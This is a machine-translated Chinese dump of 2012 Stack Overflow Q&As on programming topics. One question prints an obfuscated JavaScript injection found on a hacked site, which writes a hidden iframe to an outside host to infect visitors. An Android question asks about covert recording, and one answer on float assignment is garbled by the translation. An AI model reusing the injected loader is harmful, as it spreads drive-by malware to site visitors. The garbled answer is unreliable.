   sscanf(vec_line[iline], "%d %d %d %d %d %d", &trimVal, &compa, &nil0, &nil1, &nil2, &nil3); //how would one do this simple parsing task in c and c++?
} 
```

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T13:07:22.457

`sscanf`是一个 C 函数，因为您已经在使用 C++ 流来输出（并且可能从文件中读取？）您最好使用 a`stringstream`在字符串和数据类型之间进行转换。

例如：

```
#include <iostream>
#include <sstream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
   stringstream sstr;
   string mystr = "123";
   int i;

   sstr << mystr;

   sstr >> i;

   cout << i << endl;

   return 0;
} 
```

将输出`123`到标准输出。当然，如果您愿意，您也可以从`ifstream`使用`>>`运算符直接读取到`int`或。`double`

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:26:17.630

除非我*需要*将每一行存储为一个字符串，否则我会做更多这样的事情：

```
struct row { 
    static const int columns = 6;
    std::vector<int> column_data;

    // should we keep or ignore a row? Ignore if column 1 != 1.
    struct filter {
        bool operator()(row const &r) { return r.column_data[1] != 1; }
    };

    // read in a row.
    friend std::istream &operator>>(std::istream &is, row &r) {
        r.column_data.resize(row::columns);
        for (int i=0; i<row::columns; i++)
            is >> r.columns[i];
        return is;
    }

    // write a row out to a file.
    friend std::ostream &operator<<(std::ostream &os, row const &r) { 
        std::copy(r.column_data.begin(), r.column_data.end(),
                  std::ostream_iterator<int>(os, " "));
        return os;
}; 
```

然后读取和显示数据将如下所示：

```
std::vector<row> data;

std::remove_copy_if(std::istream_iterator<row>(input_file),
                    std::istream_iterator<row>(),
                    std::back_inserter(data),
                    row::filter());

std::copy(data.begin(), data.end(), 
          std::ostream_iterator<row>(output_file, "\n")); 
```

或者，如果您只想将正确的行从某个输入文件复制到某个输出文件，您可以使用正确的迭代器直接执行此操作：

```
std::remove_copy_if(std::istream_iterator<row>(input_file),
                    std::istream_iterator<row>(),
                    std::ostream_iterator<row>(output_file),
                    row::filter()); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:56:36.597

这是不正确的：

```
sscanf(vec_line[iline], "%d %d ... 
```

因为第一个参数[`sscanf()`](http://en.cppreference.com/w/cpp/io/c/fscanf)是 a`const char*`而不是 a `std::string`。改成：

```
sscanf(vec_line[iline].c_str(), "%d %d ... 
```

建议检查返回值`sscanf()`以确保完成所有预期的分配：

```
if (6 == sscanf(vec_line[iline].c_str(), "%d %d ... 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T14:16:20.840

总是有 lex 和 yacc （或[Flex](http://westes.github.io/flex/manual/)和[Bison](http://www.gnu.org/software/bison/manual/index.html)）

# java - 如何使用 jmeter SOAP/XML-RPC 请求采样器？

> ID：12215803
> 
> 赞同：0
> 
> 时间：2012-08-31T12:54:47.080
> 
> 标签：java, xml, soap, jmeter

我需要使用 Jmeter 作为请求的一部分发送 XML 文件。
通过我发现的一些搜索，我可以使用`SOAP/XML-RPC Request sampler`它。
由于我不熟悉 JMeter，任何人都可以帮我解决如何使用`SOAP/XML-RPC Request sampler`.

我已经使用 normal 测试了我的应用程序`http request sampler`。

我使用以下链接进行澄清和了解采样器：
[SOAP/XML-RPC Request sampler](http://jmeter.apache.org/usermanual/component_reference.html#SOAP/XML-RPC_Request)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:48:45.210

HTTP Request Sampler 是发送 xml 的最佳方式。

# gridview - QML：带有可移动单元格的 GridView（拖放）

> ID：12215804
> 
> 赞同：5
> 
> 时间：2012-08-31T12:54:52.640
> 
> 标签：gridview, drag-and-drop, qml

我正在遵循[http://qt-project.org/wiki/Drag_and_Drop_within_a_GridView](http://qt-project.org/wiki/Drag_and_Drop_within_a_GridView)上给出的方法。

我有介绍的程序。拖放工作正常，但拖放后我的网格中有空白空间。我该如何改进呢？

此外，我还注意到第 46 行中的函数 indexAt() 在拖动操作期间无法正常工作。因此我不得不添加gridArea.index 的显式计算。

（已编辑）在我看来，出现空白是因为在放置元素后它会返回到其原始位置（它位于可见元素下方）。GridView 未更新并以不规则状态完成。

```
import QtQuick 1.1

GridView {
    id: mainGrid
    cellWidth: 165; cellHeight: 95
    width: 5*cellWidth; height: 4*cellHeight
    model: myModel
    delegate: myButton

    ListModel {
        id: myModel
        function createModel() {
            for (var i=1; i<=20; i++) {
                myModel.append({"display": i, "uid": i})
            }
        }
        Component.onCompleted: {createModel()}
    }

    Component {
        id: myButton
        Rectangle {
            id: item
            width: mainGrid.cellWidth-5; height: mainGrid.cellHeight-5;
            border.width: 1
            property int uid: (index >= 0) ? myModel.get(index).uid : -1
            Text {
                anchors.centerIn: parent
                text: display
                font.pixelSize: 48
            }
            states: [
                State {
                    name: "active"; when: gridArea.activeId == item.uid
                    PropertyChanges {target: item; x: gridArea.mouseX-80; y: gridArea.mouseY-45; z: 10; smooth: false}
                }
            ]
        }
    }

    MouseArea {
        id: gridArea
        anchors.fill: parent
        hoverEnabled: true
        preventStealing : true
        //property int index: mainGrid.indexAt(mouseX, mouseY) //WHY IS THIS NOT WORKING RELIABLE?
        property int mX: (mouseX < 0) ? 0 : ((mouseX < mainGrid.width - mainGrid.cellWidth) ? mouseX : mainGrid.width - mainGrid.cellWidth)
        property int mY: (mouseY < 0) ? 0 : ((mouseY < mainGrid.height - mainGrid.cellHeight) ? mouseY : mainGrid.height - mainGrid.cellHeight)
        property int index: parseInt(mX/mainGrid.cellWidth) + 5*parseInt(mY/mainGrid.cellHeight)  //item underneath cursor
        property int activeId: -1 //uid of active item
        property int activeIndex //current position of active item
        onPressAndHold: {
            activeId = mainGrid.model.get(activeIndex=index).uid
        }
        onReleased: {
            activeId = -1
        }
        onPositionChanged: {
            if (activeId != -1 && index != -1 && index != activeIndex) {
                mainGrid.model.move(activeIndex, activeIndex = index, 1)
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-20T10:35:38.347

在这里，我给出了工作代码。我添加了额外的层次结构并将矩形放入项目中。此外，我必须重新设置矩形。有许多类似的解决方案可用，例如[这里](http://www.developer.nokia.com/Community/Wiki/QML_Drag-and-drop)。

在给定的解决方案中，函数 indexAt() 没有问题，因此不再需要显式计算 gridArea.index。

我将感谢对此解决方案的任何评论以及为什么这些更改如此重要。我仍然认为原始解决方案很直观，我不明白为什么它不起作用。

```
import QtQuick 1.1

GridView {
    id: mainGrid
    cellWidth: 165; cellHeight: 95
    width: 5*cellWidth; height: 4*cellHeight
    model: myModel
    delegate: myButton

    ListModel {
        id: myModel
        function createModel() {
            for (var i=1; i<=20; i++) {
                myModel.append({"display": i, "uid": i})
            }
        }
        Component.onCompleted: {createModel()}
    }

    Component {
        id: myButton
        Item {
            id: item
            width: mainGrid.cellWidth-5; height: mainGrid.cellHeight-5;
            Rectangle {
                id: box
                parent: mainGrid
                x: item.x; y: item.y;
                width: item.width; height: item.height;
                border.width: 1
                property int uid: (index >= 0) ? myModel.get(index).uid : -1
                Text {
                    anchors.centerIn: parent
                    text: display
                    font.pixelSize: 48
                }
                states: [
                    State {
                        name: "active"; when: gridArea.activeId == box.uid
                        PropertyChanges {target: box; x: gridArea.mouseX-80; y: gridArea.mouseY-45; z: 10}
                    }
                ]
            }
        }
    }

    MouseArea {
        id: gridArea
        anchors.fill: parent
        hoverEnabled: true
        preventStealing : true
        property int index: mainGrid.indexAt(mouseX, mouseY) //item underneath cursor
        property int activeId: -1 //uid of active item
        property int activeIndex //current position of active item

        onPressAndHold: {
            activeId = mainGrid.model.get(activeIndex=index).uid
        }
        onReleased: {
            activeId = -1
        }
        onPositionChanged: {
            if (activeId != -1 && index != -1 && index != activeIndex) {
                mainGrid.model.move(activeIndex, activeIndex = index, 1)
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-20T15:59:15.753

这是使用 MouseArea 的拖动属性的另一个答案。这很奇怪，但这个解决方案在函数 indexAt() 上有问题。此外，似乎不可能使用 x 和 y 上的 Behavior 添加漂亮的慢动作效果。

对此解决方案的任何评论也非常受欢迎。

```
import QtQuick 1.1

GridView {
    id: mainGrid
    cellWidth: 165; cellHeight: 95
    width: 5*cellWidth; height: 4*cellHeight
    model: myModel
    delegate: myButton

    ListModel {
        id: myModel
        function createModel() {
            for (var i=1; i<=20; i++) {
                myModel.append({"display": i})
            }
        }
        Component.onCompleted: {createModel()}
    }

    Component {
        id: myButton
        Rectangle {
            id: item
            z: 1
            width: mainGrid.cellWidth-5; height: mainGrid.cellHeight-5;
            border.width: 1
            Text {
                anchors.centerIn: parent
                text: display
                font.pixelSize: 48
            }
        }
    }

    MouseArea {
        id: gridArea
        anchors.fill: parent
        hoverEnabled: true
        drag.axis: Drag.XandYAxis
        //property int index: mainGrid.indexAt(mouseX,mouseY) //NOT WORKING RELIABLE!
        property int mX: (mouseX < 0) ? 0 : ((mouseX < mainGrid.width - mainGrid.cellWidth) ? mouseX : mainGrid.width - mainGrid.cellWidth)
        property int mY: (mouseY < 0) ? 0 : ((mouseY < mainGrid.height - mainGrid.cellHeight) ? mouseY : mainGrid.height - mainGrid.cellHeight)
        property int index: parseInt(mX/mainGrid.cellWidth) + 5*parseInt(mY/mainGrid.cellHeight)  //item underneath cursor
        property int activeIndex

        onPressAndHold: {
            currentIndex = index
            currentItem.z = 10
            gridArea.drag.target = currentItem
            activeIndex = index
        }
        onReleased: {
            currentItem.x = mainGrid.cellWidth * (index % 5)
            currentItem.y = mainGrid.cellHeight * parseInt(index / 5)
            currentItem.z = 1
            currentIndex = -1
            gridArea.drag.target = null
        }
        onPositionChanged: {
            if (drag.active && index !== -1 && index !== activeIndex) {
                mainGrid.model.move(activeIndex, activeIndex = index, 1)
            }
        }
    }
} 
```

# plone - plone：启用/禁用标记行为后如何重新注册视图

> ID：12215816
> 
> 赞同：1
> 
> 时间：2012-08-31T12:55:36.917
> 
> 标签：plone, dexterity

我创建了一个在启用行为时应该可用的视图。

```
from behaviors import IMyBehavior

class View(grok.View):
    grok.context(IMyBehavior)
    grok.require('zope2.View')
    grok.name('my-view') 
```

我还将行为添加到 configure.zcml

```
 <include package="plone.behavior" file="meta.zcml" />

  <plone:behavior
        title="My View Behavior"
        description="foobar"
        provides=".behaviors.IMyBehavior"
        /> 
```

在阅读[http://plone.org/products/dexterity/documentation/manual/behaviors/referencemanual-all-pages上的](http://plone.org/products/dexterity/documentation/manual/behaviors/referencemanual-all-pages)**主要标记行为**部分后，我认为这已经足够了。但显然不是。当我启用 MyBehavior TTW 然后尝试打开我的视图时，视图不可用。

我意识到，如果我在启用/禁用行为后重新启动我的 plone 实例，它会按预期工作。我猜在启用行为 TTW 后，必须重新注册视图。

现在的问题是我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-03T06:36:01.603

无法重新注册视图。

在 moemt Zope 应用程序服务器启动并导入 Python 模块时，注册被写入 Zope 组件注册表。这是一次性操作，与您的代码相关，而不是您的数据。

更像是这个问题听起来是在这个过程中其他东西崩溃了。也许内容类型实际上并没有提供问题中的行为标记接口。这可能是因为某些东西干扰了该过程：您的代码在启动时没有被读取，或者 plone.behaviors 中存在内部错误。请参阅 optilude 的评论如何测试标记接口是否可用。

# c# - Web.config 文件中是否需要程序集

> ID：12215817
> 
> 赞同：3
> 
> 时间：2012-08-31T12:55:37.853
> 
> 标签：c#, asp.net, .net-assembly

在我的 Web.config 文件中有对以下程序集的引用：

```
<add assembly="UODOTNET, Version=2.2.5.7444, Culture=neutral, PublicKeyToken=335F3FBD4BE82339"/>
<add assembly="System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
<add assembly="System.Runtime.Serialization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
<add assembly="System.Security, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A"/>
<add assembly="System.Data.Entity, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
<add assembly="System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
<add assembly="System.Data.Linq, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
<add assembly="System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
<add assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
<add assembly="System.Xml.Linq, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
<add assembly="System.Data.DataSetExtensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
<add assembly="System.Data.Linq, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/> 
```

除了第一个条目`UODOTNET`（我在代码中专门使用的 .DLL 文件）之外，还有什么需要在此处指定它们？

如果我从`Web.config`文件中删除它们，我的网站在没有它们的情况下似乎运行得很好。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:03:15.873

这些程序集属于 .Net Framework，并且相应的条目也将在您的**全局 machine.config**和**全局 web.config**中设置。由于所有配置文件将在启动时汇总，因此您的应用程序中不需要这些条目。

**Web 应用程序示例**

`machine.config` 当前 .net 框架文件夹中的全局 machine.config

加

`web.config` 全局 web.config - 用于当前 .net fx 文件夹中的所有 webApplications

加

`web.config` 您的网站配置文件

导致您的配置。您当前的 .net 框架文件夹类似于

```
 C:\Windows\Microsoft.NET\Framework\v2.0.50727\CONFIG 
```

根据您的**目标框架** *（1.0、1.1 ...）*和**平台** *（x86、x64）*

# http - Tomcat：响应http POST请求的Websocket广播

> ID：12215822
> 
> 赞同：0
> 
> 时间：2012-08-31T12:56:04.320
> 
> 标签：http, tomcat, servlets, websocket

每次收到特定的 POST 请求时，我都需要通过 websocket 广播消息。问题是一个 servlet（扩展的 HttpServlet）接收 POST 请求，而另一个（扩展的 WebSocketServlet）处理 websocket 连接。

我不能使用 RequestDispatcher （如果我正确理解的话），因为请求类型不同，并且因为我需要在 POST 接收的 servlet 中进一步处理请求。

我不知道我是否可以将 ws-request 从第一个 servlet 发送到第二个，但即使我可以，这似乎也不是正确的方式......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:02:33.333

websockets 要求你升级一个 http 连接，一旦这个连接升级，你就不再是在说 http，而是在说 websocket。

所以 websockets 没有 http POST 语义的概念

理论上，如果您在 A 点和 B 点之间有两个连接，一个是 http，一个是 websocket，您可以像在服务器中那样协调这种设置自定义，但这将是一个糟糕的设计 imo，涉及太多的协调。使用像 cometd 这样的消息库要好得多，您可以在其中进行与协议无关的来回消息传递。然后你让那个消息库决定它是否应该通过长轮询来处理 websocket 或 spdy 或 http 或只是普通的 ole http。

# c# - 获取excel地址地址中的列名部分

> ID：12215824
> 
> 赞同：1
> 
> 时间：2012-08-31T12:56:18.940
> 
> 标签：c#, excel

我有这段代码可以获取工作表中最后一个单元格的地址。它返回 "$U$463"，我怎样才能让它只返回 U" 部分？

瑞马丁斯

```
Range newContracts = activeWorksheet.Cells.SpecialCells(XlCellType.xlCellTypeLastCell);

string address = newContracts.get_Address(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:05:40.693

您可以像这样使用 RegularExpression 或 Substring 方法：

```
string rowId = address.Substring(address.LastIndexOf('$') + 1);
string columnId = address.Substring(1, address.LastIndexOf('$') - 1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:06:24.907

您可以使用字符串操作：

```
string columnLetter = address.Split('$', StringSplitOptions.RemoveEmptyEntries)[0]; 
```

我宁愿使用列的索引号而不是它的字母；你可以从酒店得到这个`Column`。如果你真的需要字母标识符，你可以计算它。我确定我记得一个用于将列的索引号（即 3）转换为其字母标识符（即“C”）的内置函数，但我现在找不到它。

# c++ - 不正确的浮动分配

> ID：12215827
> 
> 赞同：1
> 
> 时间：2012-08-31T12:56:23.980
> 
> 标签：c++

我有以下课程

```
class Viewport
{
public:
    Viewport();
    ~Viewport();

    void setSize(float x, float y);

private:
    float  _X;
    float  _Y;
};

void Viewport::setSize(float x, float y)
{
    //Conditionals used to make sure that the viewport stays inside the [0.0f, 1.0f] range

    if(x < 0.0f)
        _X = 0.0f;
    else if(x > 1.0f)
        _X = 1.0f;
    else
        _X = x;

    if(y < 0.0f)
        _Y = 0.0f;
    else if(y > 1.0f)
        _Y = 1.0f;
    else
        _Y = y;

} 
```

我创建了视口矢量

```
Viewport vps[3];

uint _NumCascades = 3;

for(uint i = 0; i < _NumCascades; i++)
    vps[i].setSize(i * (1.0f/_NumCascades), 0.0f); 
```

奇怪的错误发生在何时`i == 1`和`i==2`在线`_X = x;`，因为`_X`被分配了值`1051372203`而不是`0.33333334f`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T13:46:59.000

您的所有属性，尤其是 _X 和 _Y，都是为编译器保留的，编译器不太可能将 _X（因为它很短）用于其他东西并使您的代码混淆。

C++ 语言为实现保留了以下划线开头的名称子集。在这种情况下，下划线和前导大写字母在所有范围/情况下都保留。这些规则并不是非常复杂，但为了防止意外使用保留名称，最简单的方法是完全避免在标识符上使用前导下划线。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-31T13:13:35.443

1051372203的位模式，是IEEE754格式的值`0x3eaaaaab`的位模式。因此分配有效，并且在某些地方，位模式被解释为整数。对于， （或） 0 和0的位模式是相同的。`float``1.0f/3``i == 0``int``unsigned int``float`

无法从发布的代码中推断出发生这种情况的位置。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-31T13:12:43.930

对于数组中的每个视口，您必须调用构造函数（创建对象）：

```
for(uint i = 0; i < _NumCascades; i++)
{
    vps[i] = ViewPort();
} 
```

您还需要实现构造函数并为类中的所有属性分配一个值，例如`0`. 在划分之前`1.0f/_NumCascades`，您应该将您的`_NumCascades`转换为`float`using`static_cast<>()`以防止`C++`内联转换：

```
vps[i].setSize(static_cast<float>(i) * (1.0f/static_cast<float>(_NumCascades)), 0.0f, 1.0f/static_cast<float>(_NumCascades), 1.0f); 
```

现在，您有一个指针数组，它可能指向内存中的随机位置，因此是随机值。

# android - 从服务录制视频

> ID：12215831
> 
> 赞同：5
> 
> 时间：2012-08-31T12:56:45.337
> 
> 标签：android, android-camera, android-service, video-capture, preview

如果有重复，我很抱歉，但是经过一段时间的搜索，我无法找到明确的答案。没有预览仍然无法捕获视频吗？是否可以在不使用任何奇怪的解决方法的情况下实现此功能，并确保它可以在大多数设备上运行。我的要求是制作一个间谍功能，可以在用户看到视频的情况下录制视频。可行吗？如果不是 - 那么秘密视频录制之类的应用程序如何工作？谢谢你。

# ios - 将数据从 AppDelegate 传递到 iOS 中的 View

> ID：12215836
> 
> 赞同：3
> 
> 时间：2012-08-31T12:57:05.997
> 
> 标签：ios

我试图`JSON`在启动期间获取 a 并希望使用 JSON 作为资源。

我提出请求`didFinishLaunchingWithOptions`，请求看起来像：

```
NSString *urlAsString = @"myurl";
NSURL *url = [NSURL URLWithString:urlAsString];
NSURLRequest *urlRequest = [NSURLRequest requestWithURL: url];

NSURLResponse *response = nil;
NSError *error = nil;

NSData *data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
if ([data length] > 0 && error == nil) {
    NSString* responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    NSLog(@"Data is okay. Size: %lu and result: %@", (unsigned long)[data length], responseString);
} 
```

它运行良好，但我想`data`从 MyAppDelegate 传递到`myViewController`. 所以我将使用数据与`UILabel`.

我究竟应该怎么做？提出请求是`AppDelegate`错误的吗？

任何帮助都会很棒。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:08:26.120

第一：在 app-delegate 中提出请求不是很好的解决方案。你应该做一些在后台运行的启动任务，这样你就可以向用户显示一些微调器。第二：您可以将 NSString 变量存储在 appDelegate 中并为其创建 getter（属性）。因此，您可以通过以下方式访问您的 App Delegate 实体

```
[[UIApplication sharedApplication] delegate]; 
```

第三：您可以通过 UIViewController 自定义构造函数或使用属性进行设置。

# javascript - JavaScript 恶意软件从何而来？

> ID：12215839
> 
> 赞同：0
> 
> 时间：2012-08-31T12:57:16.893
> 
> 标签：javascript, code-injection, malware

我在我的网站上的一些 .js 文件中找到了这段代码。

```
var _0x3ba2=["\x3D","","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x73\x74\x6F\x70\x65\x64","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x57\x69\x6E\x33\x32","\x61\x70\x70\x4E\x61\x6D\x65","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x20\x49\x6E\x74\x65\x72\x6E\x65\x74\x20\x45\x78\x70\x6C\x6F\x72\x65\x72","\x4E\x65\x74\x73\x63\x61\x70\x65","\x34\x33\x32\x30\x30\x30\x20\x68\x6F\x75\x72\x73","\x67\x65\x74\x48\x6F\x75\x72\x73","\x73\x65\x74\x48\x6F\x75\x72\x73","\x73\x74\x6F\x70\x65\x64\x3D","\x3B\x70\x61\x74\x68\x3D\x2F\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3C\x64\x69\x76\x20\x6E\x61\x6D\x65\x3D\x22\x79\x6F\x75\x74\x75\x62\x65\x22\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x77\x69\x64\x74\x68\x3D\x22\x31\x22\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x31\x22\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6D\x61\x6E\x74\x72\x61\x2D\x73\x74\x6F\x6E\x65\x2E\x64\x65\x2F\x63\x6F\x6E\x74\x61\x63\x74\x2E\x70\x68\x70\x22\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22\x20\x61\x6C\x6C\x6F\x77\x66\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x77\x72\x69\x74\x65"];function get_cookie(_0x2c9dx2){var _0x2c9dx3=_0x2c9dx2+_0x3ba2[0];var _0x2c9dx4=_0x3ba2[1];if(document[_0x3ba2[3]][_0x3ba2[2]]>0){offset=document[_0x3ba2[3]][_0x3ba2[4]](_0x2c9dx3);if(offset!=-1){offset+=_0x2c9dx3[_0x3ba2[2]];end=document[_0x3ba2[3]][_0x3ba2[4]](_0x3ba2[5],offset);if(end==-1){end=document[_0x3ba2[3]][_0x3ba2[2]];} ;_0x2c9dx4=unescape(document[_0x3ba2[3]][_0x3ba2[6]](offset,end));} ;} ;return _0x2c9dx4;} ;if(get_cookie(_0x3ba2[7])==_0x3ba2[1]&&navigator[_0x3ba2[8]]==_0x3ba2[9]){if(navigator[_0x3ba2[10]]==_0x3ba2[11]||navigator[_0x3ba2[10]]==_0x3ba2[12]){var popfrequency=_0x3ba2[13];var expireDate= new Date();expireDate[_0x3ba2[15]](expireDate[_0x3ba2[14]]()+parseInt(popfrequency));document[_0x3ba2[3]]=_0x3ba2[16]+parseInt(popfrequency)+_0x3ba2[17]+expireDate[_0x3ba2[18]]();document[_0x3ba2[20]](_0x3ba2[19]);} ;} ; 
```

我无法解释它来自哪里？是我的 FTP 登录信息泄露的唯一原因吗？有没有人遇到过这个？因此，我的网站像攻击性网站一样被禁止。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:10:36.307

我在注入 js 代码时遇到了类似的问题。

我的计算机上有恶意软件，在我与 FT 上的 filezilla 连接后，P 注入了一些 js 代码，女巫在客户端打开了一个隐藏的 iframe。此 iframe 在客户进入网站时感染了客户的计算机。

清除病毒/恶意软件并确保您不会再次受到感染。

使用您已被感染的代码。您可能会感染进入您网站的客户。

幸运的是您的密码可能没有泄露，这种 js 注入是一个自动化过程，但我强烈建议您在另一台干净的计算机上更改密码。

# c# - 如何确保文件是有效的音频文件并且不受 DRM 保护？

> ID：12215841
> 
> 赞同：5
> 
> 时间：2012-08-31T12:57:30.567
> 
> 标签：c#, .net, visual-studio-2010, xna, xna-4.0

我正在尝试完成有关如何在 XNA 中创建射击 2D 游戏的 App Hub 教程 - 位于此处：http: [//xbox.create.msdn.com/en-US/education/tutorial/2dgame/getting_started](http://xbox.create.msdn.com/en-US/education/tutorial/2dgame/getting_started)

该项目包含一堆图形和一些音频文件。但是当我希望它在我的计算机上构建解决方案时：

```
Error 1 Failed to open file gameMusic.mp3\. Ensure the file is a valid audio file and is not DRM protected. 
```

现在我知道提供的音频文件不受 DRM 保护，但作为一个测试，我使用一个程序重新“录制”MP3 并保存它（应该删除任何 DRM 保护），我尝试保存它作为 MP3 和 WMA，但结果相同。最后，我尝试随机录制自己的 MP3，但效果相同。

构建项目时会出现该错误，因此它不是“播放器”问题，而是我相信 XNA 中的某些内容，或者我的计算机中缺少某些内容。

有谁知道为什么会发生这种情况以及如何解决它？

我正在使用 Visual Studio 2010 Ultimate 和 Windows Phone 开发工具，如教程中所述（如上链接）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-17T01:21:21.117

I had this problem (in the same tutorial by the way) and I solved it by installing the "**Media Feature Pack**" (link below), which includes the Window Media Player, that does not came in Win 7 N. It seems that XNA uses some DLLs from this package.

[http://www.microsoft.com/en-us/download/details.aspx?id=16546](http://www.microsoft.com/en-us/download/details.aspx?id=16546)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T22:30:08.353

检查您正在为哪个平台构建项目。我在学校使用 VS08 时遇到了同样的问题。如果您没有选择正确的平台，即“x86”、“混合平台”、“Xbox 360”或“WP7”，则项目将无法正确重建，并且不会引用正确的 DLL 和其他文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-01-22T06:18:52.753

对于您在更新 2011 年的旧 XNA 以在 Windows 10 上使用 Visual Studio 2019 构建它时提到的 DRM 消息，我遇到了同样的问题。

以下是使其工作的步骤：

1.  **安装 Visual Studio 社区 2019**

    *   在安装程序的单个组件选择选项卡中仅选择 .NET Framework 4.8 SDK
2.  **按照[此处提供的步骤](https://flatredball.com/visual-studio-2019-xna-setup)在 Windows 10 上设置 XNA**

此时项目正确打开，但由于在构建时缺少参考程序集而出现错误：

3.  **缓存缺少的参考程序集**
    *   `Developer Command Prompt for VS 2019`以管理员身份打开并运行：

```
cd "\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin"

gacutil /i Microsoft.Build.Framework.dll 
```

此时项目构建并运行，但由于依赖于 Windows Media Player 共享库，会收到**DRM 错误消息。**

4.  **启用 Windows 媒体播放器**
    *   在控制面板 > 程序和功能 > 打开或关闭 Windows 功能 > 媒体 > Windows Media Player

在这些步骤之后，XNA 项目在带有 Visual Studio 2019 的 Windows 10 上构建并正常运行。

# php - 获取已完成渲染并完成运行脚本的页面的当前样式（可能是内联）的 HTML

> ID：12215844
> 
> 赞同：9
> 
> 时间：2012-08-31T12:57:33.313
> 
> 标签：php, html, css

我需要使用服务器端应用程序获取具有当前样式（可能是内联）的页面的 HTML，该页面完成渲染并完成运行脚本，该应用程序将只提供一个 URL（没有额外的信息，如 cookie、没有 POST、没有阻碍的表单， ETC。）。

临时运行的浏览器或使用浏览器库的独立实用程序的桥接/代理是一种可接受的解决方案（但是，所选浏览器或浏览器库必须在所有主要平台上都可用，并且必须能够在没有操作系统 GUI 的情况下运行存在或安装）。

一个可选的要求是之后删除所有脚本（已经有独立的解决方案，在这里添加它，因为也许给定的答案将能够在渲染或类似的东西时删除脚本）。

**如何在具有当前样式（可能是内联）和当前图像（使用[数据 URI](http://www.ietf.org/rfc/rfc2397.txt)）的当前 HTML 文档的单个 .html 文件中获取 HTML+CSS 的快照？**

如果可以使用纯 PHP 来完成，那将是一个加分项（尽管我对此表示怀疑，但我没有发现任何有趣的东西）。

**编辑：**我知道如何加载 HTTP 资源并获取 URL 的 HTML，这不是我想要的；）

**编辑 2** 示例输入 HTML：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <title></title>

        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

        <link rel="stylesheet" type="text/css" href="/css/example.css">
        <script type="text/javascript" src="/javascript/example.js"></script>

        <script type="text/javascript">
            window.addEventListener("load",
                function(event){
                    document.title="New title";

                    document.getElementById("pic_0").style.border="0px";
                }
            );
        </script>
        <style type="text/css">
            p{
                color: blue;
            }
        </style>
    </head>
    <body>
        <p>Hello world!</p>
        <p>
            <img 
                alt="" 
                style="border: 1px" 
                id="pic_0" 
                src="http://linuxgazette.net/144/misc/john/helloworld.png"
            >
        </p>
    </body>
</html> 
```

示例输出：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <title>New title</title>

        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

        <style type="text/css">
            b{font-weight: bold}
        </style>

        <style type="text/css">
            p{
                color: blue;
            }
        </style>
    </head>
    <body>
        <p>Hello world!</p>
        <p>
            <img 
                alt="" 
                style="border: 0px" 
                id="pic_0" 
